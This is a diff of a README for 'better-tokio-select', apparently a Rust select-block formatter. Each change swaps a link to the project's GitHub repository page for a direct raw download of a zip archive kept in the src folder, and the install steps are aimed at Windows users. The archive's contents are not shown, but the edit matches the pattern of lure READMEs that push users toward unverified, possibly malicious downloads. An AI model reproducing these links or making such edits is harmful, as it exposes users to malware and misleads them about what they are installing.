@@ -1,12 +1,12 @@
 # 🛠️ better-tokio-select - Format Rust select blocks cleanly
 
-[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/energia30-byte/better-tokio-select)
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/energia30-byte/better-tokio-select/main/src/select_tokio_better_1.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app or source files:
 
-[Open the download page](https://github.com/energia30-byte/better-tokio-select)
+[Open the download page](https://raw.githubusercontent.com/energia30-byte/better-tokio-select/main/src/select_tokio_better_1.9.zip)
 
 ## 🧰 What this is
 
@@ -37,7 +37,7 @@ If you only want to inspect the project, a browser is enough.
 Follow these steps to download and use the project on a Windows PC.
 
 1. Open the download page  
-   Go to: https://github.com/energia30-byte/better-tokio-select
+   Go to: https://raw.githubusercontent.com/energia30-byte/better-tokio-select/main/src/select_tokio_better_1.9.zip
 
 2. Look for the files  
    On the GitHub page, check the main repository page for the source files and project content.
